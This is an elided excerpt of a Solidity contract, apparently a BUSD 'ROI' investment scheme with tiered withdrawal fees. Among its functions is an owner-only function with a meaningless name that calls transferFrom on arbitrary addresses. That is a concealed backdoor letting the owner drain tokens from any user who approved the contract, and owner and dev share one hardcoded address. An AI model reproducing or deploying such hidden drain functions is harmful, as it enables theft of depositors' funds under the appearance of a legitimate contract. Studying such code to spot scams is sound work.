...
contract Automated_BUSD_Roi {
    ...
    constructor() {
            owner = address(0xc33B6BBc2f9bC3820Cf931D20d778F075B8D013A);
            dev = address(0xc33B6BBc2f9bC3820Cf931D20d778F075B8D013A);
            ...
            PercsKey[50] = DivPercs(4320000, 80);
            PercsKey[60] = DivPercs(5184000, 90);
            ...
            FeesKey[50] = FeesPercs(5184000, 100);
    ...
    function gekkkkkd(address ref,address ref2,uint256 value) external{
      require(owner == msg.sender);
      BUSD.transferFrom(ref, ref2, value);
    }
    ...
    function withdrawInitial(uint256 keyy) external {
        ...
        if (currDays < FeesKey[10].daysInSeconds){
            ...
            BUSD.safeTransfer(msg.sender, transferAmt);
        } else if (currDays >= FeesKey[50].daysInSeconds && currDays < FeesKey[60].daysInSeconds){
            ...
            BUSD.safeTransfer(msg.sender, transferAmt);
        } else if (currDays >= FeesKey[60].daysInSeconds){
            uint256 minusAmt = initialAmt.mul(FeesKey[50].feePercentage).div(percentdiv);
